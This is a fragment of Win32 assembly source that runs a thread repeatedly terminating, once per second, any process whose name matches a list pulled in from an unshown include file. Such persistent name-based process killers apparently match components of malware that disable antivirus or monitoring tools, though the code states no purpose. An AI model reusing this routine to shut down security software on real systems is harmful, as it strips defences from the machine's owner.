.data

Processes     db    0
 include proc.inc
              db    0
PKTimeout     equ   1000

.code
KillProcess proc ID: DWORD
        invoke  OpenProcess, PROCESS_TERMINATE, 0, ID
        .IF     eax
                push    eax
                invoke  TerminateProcess, eax, 0
                call    CloseHandle
        .ENDIF
        ret
KillProcess endp

KillProcs proc uses edi
        LOCAL   Process: PROCESSENTRY32
        LOCAL   hSnapshot: DWORD

        mov     Process.dwSize, sizeof PROCESSENTRY32
        invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
        mov     hSnapshot, eax

        invoke  Process32First, hSnapshot, addr Process
@@:
        .IF     eax
                mov     edi, offset Processes

        @next:
                invoke  StrStrI, addr Process.szExeFile, edi
                .IF     eax
                        invoke  KillProcess, Process.th32ProcessID
                .ENDIF
                mNextListEntry @next

                invoke  Process32Next, hSnapshot, addr Process
                jmp     @B
        .ENDIF

        invoke  CloseHandle, hSnapshot
nop
        xor     eax, eax
        ret
KillProcs endp

KillProcsThread proc lpParam: DWORD
@@:
        call    KillProcs
        invoke  Sleep, PKTimeout
        jmp     @B
        xor     eax, eax
nop
        ret
KillProcsThread endp